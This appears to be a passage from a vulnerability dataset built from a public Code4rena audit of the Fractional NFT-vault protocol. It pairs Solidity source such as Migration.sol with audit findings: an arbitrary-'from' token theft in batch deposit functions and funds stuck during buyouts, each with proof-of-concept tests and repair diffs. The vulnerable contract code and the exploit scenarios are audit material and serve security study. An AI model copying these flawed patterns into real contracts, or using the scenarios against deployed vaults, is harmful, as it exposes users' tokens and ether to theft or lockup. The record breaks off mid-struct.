                "Repair": "\nIt is recommended to only allow the baseVault.batchDepositERC20, baseVault.batchDepositERC721, and baseVault.batchDepositERC1155 functions to pull tokens from the caller (msg.sender).\n\nConsidering updating the affected functions to remove the from parameter, and use msg.sender instead.\n\ndiff\nfunction batchDepositERC20(\n  address _from,\n    address _to,\n    address[] calldata _tokens,\n    uint256[] calldata _amounts\n) external {\n    for (uint256 i = 0; i < _tokens.length; ) {\n      IERC20(_tokens[i]).transferFrom(_from, _to, _amounts[i]);\n+       IERC20(_tokens[i]).transferFrom(msg.sender, _to, _amounts[i]);\n        unchecked {\n            ++i;\n        }\n    }\n}\n\n\ndiff\nfunction batchDepositERC721(\n  address _from,\n    address _to,\n    address[] calldata _tokens,\n    uint256[] calldata _ids\n) external {\n    for (uint256 i = 0; i < _tokens.length; ) {\n      IERC721(_tokens[i]).safeTransferFrom(_from, _to, _ids[i]);\n+       IERC721(_tokens[i]).safeTransferFrom(msg.sender, _to, _ids[i]);\n        unchecked {\n            ++i;\n        }\n    }\n}\n\n\ndiff\nfunction batchDepositERC1155(\n  address _from,\n    address _to,\n    address[] calldata _tokens,\n    uint256[] calldata _ids,\n    uint256[] calldata _amounts,\n    bytes[] calldata _datas\n) external {\n    unchecked {\n        for (uint256 i = 0; i < _tokens.length; ++i) {\n            IERC1155(_tokens[i]).safeTransferFrom(\n              _from,\n+               msg.sender,\n                _to,\n                _ids[i],\n                _amounts[i],\n                _datas[i]\n            );\n        }\n    }\n}\n\n\nstevennevins (Fractional) confirmed and commented(https://github.com/code-423n4/2022-07-fractional-findings/issues/468#issuecomment-1187638235):\n  Confirmed, we will be addressing this issue!\n\nHardlyDifficult (judge) commented(https://github.com/code-423n4/2022-07-fractional-findings/issues/468#issuecomment-1208628673):\n  Anyone who approved the BaseVault can have their tokens stolen. Agree this is high risk.\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {IModule} from \"./IModule.sol\";\nimport {Permission} from \"./IVaultRegistry.sol\";\n\n/// @dev Possible states that a buyout auction may have\nenum State {\n    INACTIVE,\n    LIVE,\n    SUCCESS\n}\n\n/// @dev Auction information\nstruct Auction {\n    // Time of when buyout begins\n    uint256 startTime;\n    // Address of proposer creating buyout\n    address proposer;\n    // Enum state of the buyout auction\n    State state;\n    // Price of fractional tokens\n    uint256 fractionPrice;\n    // Balance of ether in buyout pool\n    uint256 ethBalance;\n    // Total supply recorded before a buyout started\n    uint256 lastTotalSupply;\n}\n\n/// @dev Interface for Buyout module contract\ninterface IBuyout is IModule {\n    /// @dev Emitted when the payment amount does not equal the fractional price\n    error InvalidPayment();\n    /// @dev Emitted when the buyout state is invalid\n    error InvalidState(State _required, State _current);\n    /// @dev Emitted when the caller has no balance of fractional tokens\n    error NoFractions();\n    /// @dev Emitted when the caller is not the winner of an auction\n    error NotWinner();\n    /// @dev Emitted when the address is not a registered vault\n    error NotVault(address _vault);\n    /// @dev Emitted when the time has expired for selling and buying fractions\n    error TimeExpired(uint256 _current, uint256 _deadline);\n    /// @dev Emitted when the buyout auction is still active\n    error TimeNotElapsed(uint256 _current, uint256 _deadline);\n    /// @dev Emitted when ether deposit amount for starting a buyout is zero\n    error ZeroDeposit();\n\n    /// @dev Event log for starting a buyout\n    /// @param _vault Address of the vault\n    /// @param _proposer Address that created the buyout\n    /// @param _startTime Timestamp of when buyout was created\n    /// @param _buyoutPrice Price of buyout pool in ether\n    /// @param _fractionPrice Price of fractional tokens\n    event Start(\n        address indexed _vault,\n        address indexed _proposer,\n        uint256 _startTime,\n        uint256 _buyoutPrice,\n        uint256 _fractionPrice\n    );\n    /// @dev Event log for selling fractional tokens into the buyout pool\n    /// @param _seller Address selling fractions\n    /// @param _amount Transfer amount being sold\n    event SellFractions(address indexed _seller, uint256 _amount);\n    /// @dev Event log for buying fractional tokens from the buyout pool\n    /// @param _buyer Address buying fractions\n    /// @param _amount Transfer amount being bought\n    event BuyFractions(address indexed _buyer, uint256 _amount);\n    /// @dev Event log for ending an active buyout\n    /// @param _vault Address of the vault\n    /// @param _state Enum state of auction\n    /// @param _proposer Address that created the buyout\n    event End(address _vault, State _state, address indexed _proposer);\n    /// @dev Event log for cashing out ether for fractions from a successful buyout\n    /// @param _vault Address of the vault\n    /// @param _casher Address cashing out of buyout\n    /// @param _amount Transfer amount of ether\n    event Cash(address _vault, address indexed _casher, uint256 _amount);\n    /// @dev Event log for redeeming the underlying vault assets from an inactive buyout\n    /// @param _vault Address of the vault\n    /// @param _redeemer Address redeeming underlying assets\n    event Redeem(address _vault, address indexed _redeemer);\n\n    function PROPOSAL_PERIOD() external view returns (uint256);\n\n    function REJECTION_PERIOD() external view returns (uint256);\n\n    function batchWithdrawERC1155(\n        address _vault,\n        address _token,\n        address _to,\n        uint256[] memory _ids,\n        uint256[] memory _values,\n        bytes32[] memory _erc1155BatchTransferProof\n    ) external;\n\n    function buyFractions(address _vault, uint256 _amount) external payable;\n\n    function buyoutInfo(address)\n        external\n        view\n        returns (\n            uint256 startTime,\n            address proposer,\n            State state,\n            uint256 fractionPrice,\n            uint256 ethBalance,\n            uint256 lastTotalSupply\n        );\n\n    function cash(address _vault, bytes32[] memory _burnProof) external;\n\n    function end(address _vault, bytes32[] memory _burnProof) external;\n\n    function getLeafNodes() external view returns (bytes32[] memory nodes);\n\n    function getPermissions()\n        external\n        view\n        returns (Permission[] memory permissions);\n\n    function redeem(address _vault, bytes32[] memory _burnProof) external;\n\n    function registry() external view returns (address);\n\n    function sellFractions(address _vault, uint256 _amount) external;\n\n    function start(address _vault) external payable;\n\n    function supply() external view returns (address);\n\n    function transfer() external view returns (address);\n\n    function withdrawERC20(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _value,\n        bytes32[] memory _erc20TransferProof\n    ) external;\n\n    function withdrawERC721(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _tokenId,\n        bytes32[] memory _erc721TransferProof\n    ) external;\n\n    function withdrawERC1155(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _id,\n        uint256 _value,\n        bytes32[] memory _erc1155TransferProof\n    ) external;\n}\n\n\n",
        "CodeNames": [
            "IBuyout.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-14",
                "Location": [
                    "SUCCESS",
                    "ACTIVE"
                ],
                "Type": " Fund will be stuck if a buyout is started while there are pending migration proposals",
                "Description": "\nFunds in migration proposals could potentially be stuck forever if a buyout auction on the same vault is started by other party.\n\nMost of the functions within Migration.sol can only be executed depending on the state of buyout auction in Buyout.sol. When there is no buyout happening, a migration proposal can be made and anyone can contribute to the proposal. However, it is possible that a buyout auction is started by another party while a pending proposal is not commited yet.\n\nWhen this scenario happens, there is no action that could be taken to interact with the pending proposal. All funds that have been contributed cannot be withdrawn. This is because the functions only check for the state of the buyout auction, instead of also considering whether the buyout auction's proposer is Migration.sol:\n\n    (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);\n    if (id == 0) revert NotVault(_vault);\n    // Reverts if buyout state is not inactive\n    (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n    State required = State.INACTIVE;\n    if (current != required) revert IBuyout.InvalidState(required, current);\n\nProposal contributors have to wait until the buyout failed before they can withdraw their funds. In case the buyout succeeded, their funds will be stuck forever.\n\n\n*   Bob made a migration proposal and contributed 0.5 eth.\n*   Alice individually started a buyout auction. Buyout state is now ACTIVE.\n*   Bob can't leave the proposal.\n*   Alice successfully ended the buyout auction. Buyout state is now SUCCESS.\n*   Bob can't withdraw the funds.\n\nBelow are the test cases that show the scenarios described above.\n\n    function testLeaveBuyoutStarted() public {\n        initializeMigration(alice, bob, TOTAL_SUPPLY, HALF_SUPPLY, true);\n        (nftReceiverSelectors, nftReceiverPlugins) = initializeNFTReceiver();\n        // Migrate to a vault with no permissions (just to test out migration)\n        address[] memory modules = new address[(1);\n        modules[0] = address(mockModule);\n        // Bob makes the proposal\n        bob.migrationModule.propose(\n            vault,\n            modules,\n            nftReceiverPlugins,\n            nftReceiverSelectors,\n            TOTAL_SUPPLY * 2,\n            1 ether\n        );\n        // Bob joins the proposal\n        bob.migrationModule.join{value: 0.5 ether}(vault, 1, HALF_SUPPLY);\n\n        // Alice started buyout\n        alice.buyoutModule.start{value: 1 ether}(vault);\n        (, , State current, , , ) = alice.buyoutModule.buyoutInfo(vault);\n        assert(current == State.LIVE);\n\n        vm.expectRevert(\n            abi.encodeWithSelector(IBuyout.InvalidState.selector, 0, 1)\n        );\n        // Bob cannot leave\n        bob.migrationModule.leave(vault, 1);\n    }\n\n    function testLeaveBuyoutSuccess() public {\n        // Send Bob a smaller amount so Alice can win the auction\n        initializeMigration(alice, bob, TOTAL_SUPPLY, HALF_SUPPLY/2, true);\n        (nftReceiverSelectors, nftReceiverPlugins) = initializeNFTReceiver();\n        // Migrate to a vault with no permissions (just to test out migration)\n        address[] memory modules = new address[(1);\n        modules[0] = address(mockModule);\n        // Bob makes the proposal\n        bob.migrationModule.propose(\n            vault,\n            modules,\n            nftReceiverPlugins,\n            nftReceiverSelectors,\n            TOTAL_SUPPLY * 2,\n            1 ether\n        );\n        // Bob joins the proposal\n        bob.migrationModule.join{value: 0.5 ether}(vault, 1, HALF_SUPPLY/2);\n\n        // Alice did a buyout\n        alice.buyoutModule.start{value: 1 ether}(vault);\n        vm.warp(rejectionPeriod + 1);\n        alice.buyoutModule.end(vault, burnProof);\n\n        (, , State current, , , ) = alice.buyoutModule.buyoutInfo(vault);\n        assert(current == State.SUCCESS);\n\n        vm.expectRevert(\n            abi.encodeWithSelector(IBuyout.InvalidState.selector, 0, 2)\n        );\n        // Bob cannot leave\n        bob.migrationModule.leave(vault, 1);\n    }\n\n",
                "Repair": "\nModify the checks for the following functions:\n\n*   leave\n*   withdrawContribution\n\nSo users can withdraw their funds from the proposal when the buyout auction proposer is not Migration.sol.\n\nIn addition, it's also possible that there are multiple ongoing proposals on the same vault and the buyout is started by one of them. To allow other proposals' contributors to withdraw their fund, consider tracking the latest proposalId that started the buyout on a vault:\n\n    mapping(address = uint256) public latestCommit;\n\n    function commit(address _vault, uint256 _proposalId) {\n        ...\n        if (currentPrice  proposal.targetPrice) {\n            ...\n            latestCommit[_vault] = _proposalId;\n        }\n    }\n\nFor leave:\n\n    (, address proposer, State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n\n    // if buyout is started by this proposal, check that state is inactive. Else allow leaving.\n    if (proposer == address(this) && latestCommit[_vault] == _proposalId) {\n        State required = State.INACTIVE;\n        if (current != required) revert IBuyout.InvalidState(required, current);\n    }\n\nFor withdrawContribution:\n\n    (, address proposer, State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n\n    // if buyout is started by this proposal, check that state is inactive. Else allow withdrawing.\n    if (proposer == address(this) && latestCommit[_vault] == _proposalId) {\n        State required = State.INACTIVE;\n        if (current != required) revert IBuyout.InvalidState(required, current);\n    }\n    if (\n        migrationInfo[_vault][_proposalId].newVault != address(0)\n    ) revert NoContributionToWithdraw();\n\n\nstevennevins (Fractional) confirmed(https://github.com/code-423n4/2022-07-fractional-findings/issues/123)\n\nHardlyDifficult (judge) commented(https://github.com/code-423n4/2022-07-fractional-findings/issues/230#issuecomment-1212217259):\n Starting a buyout can cause migration funds to become stuck in the contract. Agree this is High risk.\n \n Selecting this submission as the primary for including POC code and including clear recs.\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: Unlicense\npragma solidity 0.8.13;\n\nimport {IBuyout, Auction, State} from \"../interfaces/IBuyout.sol\";\nimport {IERC20} from \"../interfaces/IERC20.sol\";\nimport {IERC721} from \"../interfaces/IERC721.sol\";\nimport {IERC1155} from \"../interfaces/IERC1155.sol\";\nimport {IFERC1155} from \"../interfaces/IFERC1155.sol\";\nimport {IMigration, Proposal} from \"../interfaces/IMigration.sol\";\nimport {IModule} from \"../interfaces/IModule.sol\";\nimport {IVault} from \"../interfaces/IVault.sol\";\nimport {IVaultRegistry, Permission} from \"../interfaces/IVaultRegistry.sol\";\nimport {MerkleBase} from \"../utils/MerkleBase.sol\";\nimport {Minter} from \"./Minter.sol\";\nimport {Multicall} from \"../utils/Multicall.sol\";\nimport {NFTReceiver} from \"../utils/NFTReceiver.sol\";\nimport {ReentrancyGuard} from \"@rari-capital/solmate/src/utils/ReentrancyGuard.sol\";\n\n/// @title Migration\n/// @author Fractional Art\n/// @notice Module contract for vaults to migrate to a new set of permissions\n/// - A fractional holder creates a proposal with a target price and list of modules\n/// - For 7 days, users can contribute their fractions / ether to signal support\n/// - If the target price is reached then a buyout can be triggered and trading\n///   against the proposed buyout price can take place to resolve the outcome\n/// - If a proposal holds more than 51% of the total supply, the buyout succeeds, a new vault can\n///   be created and the underlying assets (ERC-20, ERC-721 and ERC-1155 tokens) can be migrated\ncontract Migration is\n    IMigration,\n    MerkleBase,\n    Minter,\n    Multicall,\n    NFTReceiver,\n    ReentrancyGuard\n{\n    /// @notice Address of Buyout module contract\n    address payable public buyout;\n    /// @notice Address of VaultRegistry contract\n    address public registry;\n    /// @notice Counter used to assign IDs to new proposals\n    uint256 public nextId;\n    /// @notice The length for the migration proposal period\n    uint256 public constant PROPOSAL_PERIOD = 7 days;\n    /// @notice Mapping of a vault to it's proposal migration information\n    mapping(address => mapping(uint256 => Proposal)) public migrationInfo;\n    /// @notice Mapping of a proposal ID to a user's ether contribution\n    mapping(uint256 => mapping(address => uint256)) private userProposalEth;\n    /// @notice Mapping of a proposal ID to a user's fractions contribution\n    mapping(uint256 => mapping(address => uint256))\n        private userProposalFractions;\n\n    /// @notice Initializes buyout, registry, and supply contracts\n    constructor(\n        address _buyout,\n        address _registry,\n        address _supply\n    ) Minter(_supply) {\n        buyout = payable(_buyout);\n        registry = _registry;\n    }\n\n    /// @dev Callback for receiving ether when the calldata is empty\n    receive() external payable {}\n\n    /// @notice Proposes a set of modules and plugins to migrate a vault to\n    /// @param _vault Address of the vault\n    /// @param _modules Addresses of module contracts\n    /// @param _plugins Addresses of plugin contracts\n    /// @param _selectors List of plugin function selectors\n    /// @param _newFractionSupply New supply of fractional tokens\n    /// @param _targetPrice Target price of the buyout\n    function propose(\n        address _vault,\n        address[] calldata _modules,\n        address[] calldata _plugins,\n        bytes4[] calldata _selectors,\n        uint256 _newFractionSupply,\n        uint256 _targetPrice\n    ) external {\n        // Reverts if address is not a registered vault\n        (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if buyout state is not inactive\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        State required = State.INACTIVE;\n        if (current != required) revert IBuyout.InvalidState(required, current);\n\n        // Initializes migration proposal info\n        Proposal storage proposal = migrationInfo[_vault][++nextId];\n        proposal.startTime = block.timestamp;\n        proposal.targetPrice = _targetPrice;\n        proposal.modules = _modules;\n        proposal.plugins = _plugins;\n        proposal.selectors = _selectors;\n        proposal.oldFractionSupply = IVaultRegistry(registry).totalSupply(\n            _vault\n        );\n        proposal.newFractionSupply = _newFractionSupply;\n    }\n\n    /// @notice Joins a migration proposal by contributing ether and fractional tokens\n    /// @param _vault The address of the vault\n    /// @param _proposalId ID of the proposal being contributed to\n    /// @param _amount Number of fractions being contributed\n    function join(\n        address _vault,\n        uint256 _proposalId,\n        uint256 _amount\n    ) external payable nonReentrant {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if buyout state is not inactive\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        State required = State.INACTIVE;\n        if (current != required) revert IBuyout.InvalidState(required, current);\n\n        // Gets the migration proposal for the given ID\n        Proposal storage proposal = migrationInfo[_vault][_proposalId];\n        // Updates ether balances of the proposal and caller\n        proposal.totalEth += msg.value;\n        userProposalEth[_proposalId][msg.sender] += msg.value;\n        // Deposits fractional tokens into contract\n        IFERC1155(token).safeTransferFrom(\n            msg.sender,\n            address(this),\n            id,\n            _amount,\n            \"\"\n        );\n        // Updates fraction balances of the proposal and caller\n        proposal.totalFractions += _amount;\n        userProposalFractions[_proposalId][msg.sender] += _amount;\n    }\n\n    /// @notice Leaves a proposed migration with contribution amount\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal being left\n    function leave(address _vault, uint256 _proposalId) external {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if buyout state is not inactive\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        State required = State.INACTIVE;\n        if (current != required) revert IBuyout.InvalidState(required, current);\n\n        // Gets the migration proposal for the given ID\n        Proposal storage proposal = migrationInfo[_vault][_proposalId];\n        // Updates fraction balances of the proposal and caller\n        uint256 amount = userProposalFractions[_proposalId][msg.sender];\n        proposal.totalFractions -= amount;\n        userProposalFractions[_proposalId][msg.sender] = 0;\n        // Updates ether balances of the proposal and caller\n        uint256 ethAmount = userProposalEth[_proposalId][msg.sender];\n        proposal.totalEth -= ethAmount;\n        userProposalEth[_proposalId][msg.sender] = 0;\n\n        // Withdraws fractions from contract back to caller\n        IFERC1155(token).safeTransferFrom(\n            address(this),\n            msg.sender,\n            id,\n            amount,\n            \"\"\n        );\n        // Withdraws ether from contract back to caller\n        payable(msg.sender).transfer(ethAmount);\n    }\n\n    /// @notice Kicks off the buyout process for a migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal being committed to\n    /// @return started Bool status of starting the buyout process\n    function commit(address _vault, uint256 _proposalId)\n        external\n        returns (bool started)\n    {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if buyout state is not inactive\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        State required = State.INACTIVE;\n        if (current != required) revert IBuyout.InvalidState(required, current);\n        // Reverts if migration is passed proposal period\n        Proposal storage proposal = migrationInfo[_vault][_proposalId];\n        if (block.timestamp > proposal.startTime + PROPOSAL_PERIOD)\n            revert ProposalOver();\n\n        // Calculates current price of the proposal based on total supply\n        uint256 currentPrice = _calculateTotal(\n            100,\n            IVaultRegistry(registry).totalSupply(_vault),\n            proposal.totalEth,\n            proposal.totalFractions\n        );\n\n        // Checks if the current price is greater than target price of the proposal\n        if (currentPrice > proposal.targetPrice) {\n            // Sets token approval to the buyout contract\n            IFERC1155(token).setApprovalFor(address(buyout), id, true);\n            // Starts the buyout process\n            IBuyout(buyout).start{value: proposal.totalEth}(_vault);\n            proposal.isCommited = true;\n            started = true;\n        }\n    }\n\n    /// @notice Settles a migration by ending the buyout\n    /// @dev Succeeds if buyout goes through, fails otherwise\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal being settled\n    function settleVault(address _vault, uint256 _proposalId) external {\n        // Reverts if the migration was not proposed\n        Proposal storage proposal = migrationInfo[_vault][_proposalId];\n        if (!(proposal.isCommited)) revert NotProposed();\n        // Reverts if the migration was unsuccessful\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        if (current != State.SUCCESS) revert UnsuccessfulMigration();\n        // Reverts if the new vault has already been deployed\n        if (proposal.newVault != address(0))\n            revert NewVaultAlreadyDeployed(proposal.newVault);\n\n        // Gets the merkle root for the vault and given proposal ID\n        bytes32[] memory merkleTree = generateMerkleTree(proposal.modules);\n        bytes32 merkleRoot = getRoot(merkleTree);\n        // Deploys a new vault with set permissions and plugins\n        address newVault = IVaultRegistry(registry).create(\n            merkleRoot,\n            proposal.plugins,\n            proposal.selectors\n        );\n        // Sets address of the newly deployed vault\n        proposal.newVault = newVault;\n        // Emits event for settling the new vault\n        emit VaultMigrated(\n            _vault,\n            newVault,\n            _proposalId,\n            proposal.modules,\n            proposal.plugins,\n            proposal.selectors\n        );\n    }\n\n    /// @notice Mints the fractional tokens for a new vault\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal\n    /// @param _mintProof Merkle proof for minting fractional tokens\n    function settleFractions(\n        address _vault,\n        uint256 _proposalId,\n        bytes32[] calldata _mintProof\n    ) external {\n        // Reverts if the migration was unsuccessful\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        if (current != State.SUCCESS) revert UnsuccessfulMigration();\n        // Reverts if there is no new vault to migrate to\n        Proposal storage proposal = migrationInfo[_vault][_proposalId];\n        if (proposal.newVault == address(0)) revert NoVaultToMigrateTo();\n        // Reverts if fractions of the new vault have already been minted\n        if (proposal.fractionsMigrated) revert NewFractionsAlreadyMinted();\n\n        // Mints initial supply of fractions for the new vault\n        _mintFractions(\n            proposal.newVault,\n            address(this),\n            proposal.newFractionSupply,\n            _mintProof\n        );\n\n        migrationInfo[_vault][_proposalId].fractionsMigrated = true;\n        // Emits event for minting fractional tokens for the new vault\n        emit FractionsMigrated(\n            _vault,\n            proposal.newVault,\n            _proposalId,\n            proposal.newFractionSupply\n        );\n    }\n\n    /// @notice Retrieves ether and fractions deposited from an unsuccessful migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the failed proposal\n    function withdrawContribution(address _vault, uint256 _proposalId)\n        external\n    {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if caller has no fractional balance to withdraw\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        if (\n            current != State.INACTIVE ||\n            migrationInfo[_vault][_proposalId].newVault != address(0)\n        ) revert NoContributionToWithdraw();\n\n        // Temporarily store user's fractions for the transfer\n        uint256 userFractions = userProposalFractions[_proposalId][msg.sender];\n        // Updates fractional balance of caller\n        userProposalFractions[_proposalId][msg.sender] = 0;\n        // Withdraws fractional tokens from contract back to caller\n        IFERC1155(token).safeTransferFrom(\n            address(this),\n            msg.sender,\n            id,\n            userFractions,\n            \"\"\n        );\n\n        // Temporarily store user's eth for the transfer\n        uint256 userEth = userProposalEth[_proposalId][msg.sender];\n        // Udpates ether balance of caller\n        userProposalEth[_proposalId][msg.sender] = 0;\n        // Withdraws ether from contract back to caller\n        payable(msg.sender).transfer(userEth);\n    }\n\n    /// @notice Migrates an ERC-20 token to the new vault after a successful migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal\n    /// @param _token Address of the ERC-20 token\n    /// @param _amount Transfer amount\n    /// @param _erc20TransferProof Merkle proof for transferring an ERC-20 token\n    function migrateVaultERC20(\n        address _vault,\n        uint256 _proposalId,\n        address _token,\n        uint256 _amount,\n        bytes32[] calldata _erc20TransferProof\n    ) external {\n        address newVault = migrationInfo[_vault][_proposalId].newVault;\n        // Withdraws an ERC-20 token from the old vault and transfers to the new vault\n        IBuyout(buyout).withdrawERC20(\n            _vault,\n            _token,\n            newVault,\n            _amount,\n            _erc20TransferProof\n        );\n    }\n\n    /// @notice Migrates an ERC-721 token to the new vault after a successful migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal\n    /// @param _token Address of the ERC-721 token\n    /// @param _tokenId ID of the token\n    /// @param _erc721TransferProof Merkle proof for transferring an ERC-721 token\n    function migrateVaultERC721(\n        address _vault,\n        uint256 _proposalId,\n        address _token,\n        uint256 _tokenId,\n        bytes32[] calldata _erc721TransferProof\n    ) external {\n        address newVault = migrationInfo[_vault][_proposalId].newVault;\n        // Withdraws an ERC-721 token from the old vault and transfers to the new vault\n        IBuyout(buyout).withdrawERC721(\n            _vault,\n            _token,\n            newVault,\n            _tokenId,\n            _erc721TransferProof\n        );\n    }\n\n    /// @notice Migrates an ERC-1155 token to the new vault after a successful migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal\n    /// @param _token Address of the ERC-1155 token\n    /// @param _id ID of the token\n    /// @param _amount amount to be transferred\n    /// @param _erc1155TransferProof Merkle proof for transferring an ERC-1155 token\n    function migrateVaultERC1155(\n        address _vault,\n        uint256 _proposalId,\n        address _token,\n        uint256 _id,\n        uint256 _amount,\n        bytes32[] calldata _erc1155TransferProof\n    ) external {\n        address newVault = migrationInfo[_vault][_proposalId].newVault;\n        // Withdraws an ERC-1155 token from the old vault and transfers to the new vault\n        IBuyout(buyout).withdrawERC1155(\n            _vault,\n            _token,\n            newVault,\n            _id,\n            _amount,\n            _erc1155TransferProof\n        );\n    }\n\n    /// @notice Batch migrates multiple ERC-1155 tokens to the new vault after a successful migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal\n    /// @param _token Address of the ERC-1155 token\n    /// @param _ids IDs of each token type\n    /// @param _amounts Transfer amounts per token type\n    /// @param _erc1155BatchTransferProof Merkle proof for batch transferring multiple ERC-1155 tokens\n    function batchMigrateVaultERC1155(\n        address _vault,\n        uint256 _proposalId,\n        address _token,\n        uint256[] calldata _ids,\n        uint256[] calldata _amounts,\n        bytes32[] calldata _erc1155BatchTransferProof\n    ) external {\n        address newVault = migrationInfo[_vault][_proposalId].newVault;\n        // Batch withdraws multiple ERC-1155 tokens from the old vault and transfers to the new vault\n        IBuyout(buyout).batchWithdrawERC1155(\n            _vault,\n            _token,\n            newVault,\n            _ids,\n            _amounts,\n            _erc1155BatchTransferProof\n        );\n    }\n\n    /// @notice Migrates the caller's fractions from an old vault to a new one after a successful migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal\n    function migrateFractions(address _vault, uint256 _proposalId) external {\n        // Reverts if address is not a registered vault\n        (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if buyout state is not successful\n        (, address proposer, State current, , , ) = IBuyout(buyout).buyoutInfo(\n            _vault\n        );\n        State required = State.SUCCESS;\n        if (current != required) revert IBuyout.InvalidState(required, current);\n        // Reverts if proposer of buyout is not this contract\n        if (proposer != address(this)) revert NotProposalBuyout();\n\n        // Gets the last total supply of fractions for the vault\n        (, , , , , uint256 lastTotalSupply) = IBuyout(buyout).buyoutInfo(\n            _vault\n        );\n        // Calculates the total ether amount of a successful proposal\n        uint256 totalInEth = _calculateTotal(\n            1 ether,\n            lastTotalSupply,\n            migrationInfo[_vault][_proposalId].totalEth,\n            migrationInfo[_vault][_proposalId].totalFractions\n        );\n        // Calculates balance of caller based on ether contribution\n        uint256 balanceContributedInEth = _calculateContribution(\n            totalInEth,\n            lastTotalSupply,\n            userProposalEth[_proposalId][msg.sender],\n            userProposalFractions[_proposalId][msg.sender]\n        );\n\n        // Gets the token and fraction ID of the new vault\n        address newVault = migrationInfo[_vault][_proposalId].newVault;\n        (address token, uint256 newFractionId) = IVaultRegistry(registry)\n            .vaultToToken(newVault);\n        // Calculates share amount of fractions for the new vault based on the new total supply\n        uint256 newTotalSupply = IVaultRegistry(registry).totalSupply(newVault);\n        uint256 shareAmount = (balanceContributedInEth * newTotalSupply) /\n            totalInEth;\n\n        // Transfers fractional tokens to caller based on share amount\n        IFERC1155(token).safeTransferFrom(\n            address(this),\n            msg.sender,\n            newFractionId,\n            shareAmount,\n            \"\"\n        );\n    }\n\n    /// @notice Generates the merkle tree of a given proposal\n    /// @param _modules List of module contracts\n    /// @return hashes Combined list of leaf nodes\n    function generateMerkleTree(address[] memory _modules)\n        public\n        view\n        returns (bytes32[] memory hashes)\n    {\n        uint256 treeLength;\n        uint256 modulesLength = _modules.length;\n\n        unchecked {\n            for (uint256 i; i < modulesLength; ++i) {\n                treeLength += IModule(_modules[i]).getLeafNodes().length;\n            }\n        }\n\n        uint256 counter;\n        hashes = new bytes32[](treeLength);\n        unchecked {\n            for (uint256 i; i < modulesLength; ++i) {\n                bytes32[] memory leaves = IModule(_modules[i]).getLeafNodes();\n                uint256 leavesLength = leaves.length;\n                for (uint256 j; j < leavesLength; ++j) {\n                    hashes[counter++] = leaves[j];\n                }\n            }\n        }\n    }\n\n    /// @notice Calculates the total amount of ether\n    /// @param _scalar Scalar used for multiplication\n    /// @param _lastTotalSupply Previous total fractional supply of the vault\n    /// @param _totalEth Total ether balance of the proposal\n    /// @param _totalFractions Total fractional balance of the proposal\n    /// @return Total amount of ether\n    function _calculateTotal(\n        uint256 _scalar,\n        uint256 _lastTotalSupply,\n        uint256 _totalEth,\n        uint256 _totalFractions\n    ) private pure returns (uint256) {\n        return\n            (_totalEth * _scalar) /\n            (_scalar - ((_totalFractions * _scalar) / _lastTotalSupply));\n    }\n\n    /// @notice Calculates the amount of ether contributed by the user\n    /// @param _totalInEth Total amount of ether\n    /// @param _lastTotalSupply Previous total fractional supply of the vault\n    /// @param _userProposalEth User balance of ether for the proposal\n    /// @param _userProposalFractions User balance of fractions for the proposal\n    /// @return Total contribution amount\n    function _calculateContribution(\n        uint256 _totalInEth,\n        uint256 _lastTotalSupply,\n        uint256 _userProposalEth,\n        uint256 _userProposalFractions\n    ) private pure returns (uint256) {\n        return\n            _userProposalEth +\n            (_userProposalFractions * _totalInEth) /\n            _lastTotalSupply;\n    }\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {Permission} from \"./IVaultRegistry.sol\";\nimport {State} from \"./IBuyout.sol\";\n\n/// @dev Struct of migration proposal info for a vault\nstruct Proposal {\n    // Start time of the migration proposal\n    uint256 startTime;\n    // Target buyout price for the migration\n    uint256 targetPrice;\n    // Total ether contributed to the migration\n    uint256 totalEth;\n    // Total fractions contributed to the migration\n    uint256 totalFractions;\n    // Module contract addresses proposed for the migration\n    address[] modules;\n    // Plugin contract addresses proposed for the migration\n    address[] plugins;\n    // Function selectors for the proposed 